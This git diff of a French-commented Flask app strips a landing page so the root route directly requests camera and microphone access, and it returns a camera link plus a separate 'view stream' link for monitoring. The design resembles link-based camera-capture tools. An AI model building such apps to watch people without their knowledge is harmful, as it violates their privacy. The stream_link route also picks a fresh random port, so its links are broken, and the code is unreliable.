@@ -26,13 +26,6 @@ display_interface()
 # Initialiser l'application Flask
 app = Flask(__name__)
 
-# Variable globale pour stocker la caméra active (avant ou arrière)
-camera_mode = "rear"  # Par défaut, la caméra arrière
-
-# Obtenir un port aléatoire dans une plage spécifique
-def get_random_port(start=1024, end=65535):
-    return random.randint(start, end)
-
 # Obtenir l'adresse IP locale
 def get_local_ip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -45,43 +38,36 @@ def get_local_ip():
         s.close()
     return ip
 
+# Générer un port aléatoire pour chaque exécution
+def get_random_port():
+    return random.randint(10000, 65535)
+
 @app.route("/")
 def home():
-    # Page d'accueil
-    return render_template("home.html")
-
-@app.route("/camera")
-def camera():
-    # Page pour demander l'accès à la caméra et au micro
+    # Page qui demande l'accès à la caméra et au micro
     return render_template("camera.html")
-
-@app.route("/control")
-def control():
-    # Page pour contrôler les données transmises et changer de caméra
-    return render_template("control.html")
-
-@app.route("/change_camera", methods=["POST"])
-def change_camera():
-    global camera_mode
-    # Basculer entre "front" (caméra avant) et "rear" (caméra arrière)
-    camera_mode = request.json.get("mode", "rear")
-    return jsonify({"status": "success", "current_mode": camera_mode})
 
 @app.route("/stream_link", methods=["POST"])
 def stream_link():
-    # Génère un lien contenant l'adresse IP et le port
+    # Génère un lien contenant l'adresse IP et le port pour la caméra
     local_ip = get_local_ip()
-    stream_url = f"http://{local_ip}:{port}/view_stream"
-    return jsonify({"stream_url": stream_url, "camera_mode": camera_mode})
+    port = get_random_port()  # Port aléatoire à chaque exécution
+    camera_url = f"http://{local_ip}:{port}/camera"
+    view_stream_url = f"http://{local_ip}:{port}/view_stream"  # Lien pour surveiller les données
 
+    return jsonify({
+        "camera_url": camera_url,
+        "view_stream_url": view_stream_url
+    })
+
+# Flux vidéo
 @app.route("/view_stream")
 def view_stream():
-    # Page pour afficher le flux vidéo
-    return render_template("view_stream.html", camera_mode=camera_mode)
+    return render_template("view_stream.html")
 
 if __name__ == "__main__":
-    # Générer un port dynamique
-    port = get_random_port()
+    # Exécuter le serveur Flask
     local_ip = get_local_ip()
+    port = get_random_port()  # Port aléatoire à chaque exécution
     print(f"Serveur en cours d'exécution : http://{local_ip}:{port}")
     app.run(host="0.0.0.0", port=port)
